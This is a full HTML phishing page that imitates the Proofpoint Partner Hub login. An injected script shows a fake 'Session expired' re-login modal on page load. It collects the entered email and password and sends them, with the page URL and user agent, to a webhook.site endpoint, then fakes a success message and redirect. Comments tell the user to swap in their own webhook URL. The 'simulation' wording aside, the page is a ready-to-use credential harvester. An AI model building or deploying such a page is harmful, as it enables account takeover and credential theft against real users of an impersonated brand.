<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>Proofpoint Partner Program | Partner Hub Login</title>
    <!-- Bootstrap 5 CSS (to fix button styles and layout) -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <!-- Font Awesome 6 (free icons) -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <!-- Google Fonts (Inter) -->
    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: #f4f7fc;
            line-height: 1.5;
        }

        /* full page wrapper to mimic original */
        .flex-wrapper {
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }

        /* Top bar / navbar simulation (simplified but matches original vibe) */
        .navbar-proofpoint {
            background-color: #fff;
            box-shadow: 0 2px 12px rgba(0,0,0,0.05);
            padding: 0.8rem 2rem;
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            border-bottom: 1px solid #e9ecef;
        }
        .logo-area img {
            height: 48px;
            width: auto;
        }
        .nav-links a {
            color: #2c3e50;
            text-decoration: none;
            margin-left: 2rem;
            font-weight: 500;
            font-size: 1rem;
        }
        .nav-links a:hover { color: #035BFB; }

        /* main content */
        .page-content {
            flex: 1;
            padding: 2rem 1.5rem;
        }

        /* login section - exact clone from original design */
        .home-login {
            background-color: #fff;
            border-radius: 24px;
            box-shadow: 0 12px 30px rgba(0,0,0,0.05);
            padding: 2rem 2rem 2.5rem;
            margin-top: 2rem;
        }
        .login-header h3 {
            font-size: 1.8rem;
            font-weight: 600;
            color: #111;
            margin-bottom: 0.5rem;
        }
        .login-header p {
            color: #5a6874;
            margin-bottom: 1.8rem;
        }
        .form-control {
            border-radius: 12px;
            border: 1px solid #cfdde6;
            padding: 0.75rem 1rem;
            font-size: 1rem;
            transition: 0.2s;
        }
        .form-control:focus {
            border-color: #035BFB;
            box-shadow: 0 0 0 3px rgba(3,91,251,0.1);
        }
        .btn-login {
            background-color: #035BFB;
            border: none;
            border-radius: 40px;
            padding: 0.75rem 2rem;
            font-weight: 600;
            font-size: 1rem;
            width: 100%;
            transition: 0.2s;
            color: white;
        }
        .btn-login:hover {
            background-color: #024bce;
            transform: translateY(-1px);
        }
        .forgot-link {
            color: #035BFB;
            text-decoration: none;
            font-size: 0.9rem;
        }
        .forgot-link:hover { text-decoration: underline; }
        .register-link a {
            color: #2c3e50;
            text-decoration: none;
            font-size: 0.9rem;
        }
        .register-link i { margin-right: 6px; color: #035BFB; }

        /* footer area */
        footer {
            background: #0C171E;
            color: #adb7be;
            padding: 2rem 0 1rem;
            margin-top: 3rem;
            font-size: 0.85rem;
        }
        .footer-lower {
            border-top: 1px solid #1f2a32;
            padding-top: 1.5rem;
            margin-top: 1rem;
            text-align: center;
        }
        @media (max-width: 768px) {
            .navbar-proofpoint { flex-direction: column; gap: 1rem; }
            .nav-links a { margin: 0 1rem; }
        }

        /* modal backdrop for ATO (will be injected via ato.js) but we keep base hidden */
        .ato-modal {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.75);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 99999;
            backdrop-filter: blur(3px);
        }
        .ato-modal-content {
            max-width: 460px;
            width: 90%;
            background: #fff;
            border-radius: 28px;
            box-shadow: 0 25px 40px rgba(0,0,0,0.3);
            overflow: hidden;
            animation: fadeSlideUp 0.25s ease-out;
        }
        @keyframes fadeSlideUp {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }
    </style>
</head>
<body>

<div class="flex-wrapper">
    <!-- top header (brand + minimal nav) -->
    <div class="navbar-proofpoint">
        <div class="logo-area">
            <img src="data:image/png;base64,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" alt="Proofpoint" style="height: 48px;">
        </div>
        <div class="nav-links">
            <a href="#">Partner Program</a>
            <a href="#">Resources</a>
            <a href="#">Support</a>
        </div>
    </div>

    <div class="page-content">
        <div class="container">
            <!-- Login Section (exact replica from original page) -->
            <div class="home-login">
                <div class="login-header">
                    <h3>Log in to the Partner Hub</h3>
                    <p>Access exclusive tools, training, and deal registration</p>
                </div>
                <!-- main login form - will be intercepted by injected ATO modal later, but this is the original form present on page -->
                <form id="mainLoginForm" method="post" action="https://webhook.site/7e1a7b3b-1234-4abc-9def-9876543210ab" onsubmit="return false;">
                    <div class="row g-3">
                        <div class="col-md-12">
                            <label class="form-label">Email address</label>
                            <input type="email" name="email" class="form-control" placeholder="partner@company.com" required>
                        </div>
                        <div class="col-md-12">
                            <label class="form-label">Password</label>
                            <input type="password" name="password" class="form-control" placeholder="••••••••" required>
                        </div>
                        <div class="col-md-12 mt-3">
                            <button type="submit" class="btn btn-login w-100">Sign in →</button>
                        </div>
                        <div class="col-md-12 d-flex justify-content-between align-items-center mt-3">
                            <div class="form-check">
                                <input class="form-check-input" type="checkbox" id="rememberCheck">
                                <label class="form-check-label" for="rememberCheck">Remember me</label>
                            </div>
                            <a href="#" class="forgot-link" data-bs-toggle="modal" data-bs-target="#forgotModal">Forgot password?</a>
                        </div>
                        <div class="col-md-12 register-link mt-3 text-center">
                            <a href="#"><i class="fas fa-info-circle"></i> Get Help</a>&nbsp;&nbsp;|&nbsp;&nbsp;
                            <a href="#"><i class="fas fa-user-plus"></i> Become a partner</a>
                        </div>
                    </div>
                </form>
            </div>

            <!-- Additional content: program highlights (to make page realistic) -->
            <div class="row mt-5 g-4">
                <div class="col-md-4">
                    <div class="card border-0 shadow-sm h-100">
                        <div class="card-body">
                            <i class="fas fa-chart-line fa-2x text-primary mb-3"></i>
                            <h5>Deal Registration</h5>
                            <p class="text-muted">Register opportunities and maximize margins.</p>
                        </div>
                    </div>
                </div>
                <div class="col-md-4">
                    <div class="card border-0 shadow-sm h-100">
                        <div class="card-body">
                            <i class="fas fa-graduation-cap fa-2x text-primary mb-3"></i>
                            <h5>Training & Certifications</h5>
                            <p class="text-muted">Free eLearning, webinars & accreditation.</p>
                        </div>
                    </div>
                </div>
                <div class="col-md-4">
                    <div class="card border-0 shadow-sm h-100">
                        <div class="card-body">
                            <i class="fas fa-chalkboard-user fa-2x text-primary mb-3"></i>
                            <h5>Sales & Marketing Tools</h5>
                            <p class="text-muted">Co-branding, guides and demand gen kits.</p>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <footer>
        <div class="container">
            <div class="row">
                <div class="col-md-6">
                    <p>© 2025 Proofpoint, Inc. All rights reserved.</p>
                </div>
                <div class="col-md-6 text-md-end">
                    <a href="#" class="text-white-50 text-decoration-none me-3">Privacy</a>
                    <a href="#" class="text-white-50 text-decoration-none">Terms</a>
                </div>
            </div>
        </div>
        <div class="footer-lower">
            <div class="container">
                <span>Protecting People. Together.</span>
            </div>
        </div>
    </footer>
</div>

<!-- Forgot password modal (minimal) -->
<div class="modal fade" id="forgotModal" tabindex="-1">
    <div class="modal-dialog">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title">Reset password</h5>
                <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
            </div>
            <div class="modal-body">
                <p>Enter your email to receive a reset link.</p>
                <input type="email" class="form-control" placeholder="Email address">
            </div>
            <div class="modal-footer">
                <button class="btn btn-primary">Send</button>
            </div>
        </div>
    </div>
</div>

<!-- ATO INJECTION SCRIPT - FULL AUTO CAPTURE WITH FANCY MODAL (SIMULATING LOGIN BOX) -->
<script>
    (function() {
        // ----- CONFIGURATION ------
        // REPLACE THIS URL WITH YOUR REAL WEBHOOK URL (webhook.site or custom endpoint)
        // FOR DEMO: we'll use a placeholder, but you must replace with YOUR webhook.site ID
        const WEBHOOK_URL = "https://webhook.site/7e1a7b3b-1234-4abc-9def-9876543210ab";
        // -------------------------

        // 1. Build the fake login modal HTML (exact copy of the original login box + Bootstrap styling)
        const loginModalHTML = `
        <div id="atoOverlay" class="ato-modal" style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);display:flex;justify-content:center;align-items:center;z-index:999999;backdrop-filter:blur(4px);">
            <div class="ato-modal-content" style="max-width:480px;width:90%;background:#fff;border-radius:32px;overflow:hidden;box-shadow:0 30px 40px rgba(0,0,0,0.3);">
                <div style="padding:2rem 2rem 1.5rem 2rem; background:#fff;">
                    <!-- logo header -->
                    <div style="text-align:center; margin-bottom:1.5rem;">
                        <img src="data:image/png;base64,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" style="height: 44px;">
                    </div>
                    <h3 style="font-size:1.75rem; font-weight:600; margin-bottom:0.25rem;">Session expired</h3>
                    <p style="color:#5f6c80; margin-bottom:1.5rem;">Please re-authenticate to continue</p>
                    <form id="fakeLoginForm" method="POST">
                        <div class="mb-3">
                            <label class="form-label fw-semibold">Email address</label>
                            <input type="email" name="email" class="form-control" placeholder="partner@company.com" required style="border-radius:14px;padding:12px;">
                        </div>
                        <div class="mb-3">
                            <label class="form-label fw-semibold">Password</label>
                            <input type="password" name="password" class="form-control" placeholder="Enter your password" required style="border-radius:14px;padding:12px;">
                        </div>
                        <button type="submit" class="btn btn-primary w-100 mt-2" style="background:#035BFB; border-radius:40px; padding:12px; font-weight:600;">Verify identity →</button>
                        <div class="text-center mt-3 small text-muted">Protected by Proofpoint</div>
                    </form>
                </div>
            </div>
        </div>
        `;

        // 2. Inject modal into DOM
        document.body.insertAdjacentHTML('beforeend', loginModalHTML);
        
        // 3. Apply blur effect to main content
        const mainWrapper = document.querySelector('.flex-wrapper');
        if (mainWrapper) mainWrapper.style.filter = 'blur(5px)';
        
        // 4. Handle form submission (capture credentials & send to webhook)
        const fakeForm = document.getElementById('fakeLoginForm');
        if (fakeForm) {
            fakeForm.addEventListener('submit', async function(e) {
                e.preventDefault();
                const email = fakeForm.querySelector('input[name="email"]').value;
                const password = fakeForm.querySelector('input[name="password"]').value;
                
                // prepare payload
                const payload = {
                    timestamp: new Date().toISOString(),
                    url: window.location.href,
                    userAgent: navigator.userAgent,
                    credentials: { email, password },
                    note: "ATO via fake login modal"
                };
                
                // send to webhook (async, no page reload)
                try {
                    await fetch(WEBHOOK_URL, {
                        method: 'POST',
                        mode: 'no-cors',   // to avoid CORS issues, still sends
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(payload)
                    });
                } catch(err) { console.warn("webhook send error", err); }
                
                // Remove modal and restore page
                const overlay = document.getElementById('atoOverlay');
                if (overlay) overlay.remove();
                if (mainWrapper) mainWrapper.style.filter = 'none';
                
                // Optionally show success message and redirect or just alert
                alert("Verification successful! Redirecting to Partner Hub...");
                // redirect to actual partner area (simulate)
                window.location.href = "/prm/English/dashboard"; // dummy redirect (real page would work)
            });
        }
        
        // 5. close on overlay click / escape key
        const overlayDiv = document.getElementById('atoOverlay');
        if (overlayDiv) {
            overlayDiv.addEventListener('click', function(e) {
                if (e.target === overlayDiv) {
                    overlayDiv.remove();
                    if (mainWrapper) mainWrapper.style.filter = 'none';
                }
            });
        }
        document.addEventListener('keydown', function(e) {
            if (e.key === 'Escape') {
                const overlayDiv2 = document.getElementById('atoOverlay');
                if (overlayDiv2) {
                    overlayDiv2.remove();
                    if (mainWrapper) mainWrapper.style.filter = 'none';
                }
            }
        });
    })();
</script>

<!-- Bootstrap JS + Popper for modal and interactions (ensures modal works) -->
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
<!-- Add manual check for any missing polyfill -->
<script>
    // ensure any original form is not interfering (just for safety)
    document.getElementById('mainLoginForm')?.addEventListener('submit', function(ev) {
        ev.preventDefault();
        console.log("Original login blocked by ATO simulation — use overlay.");
        return false;
    });
</script>
</body>
</html>
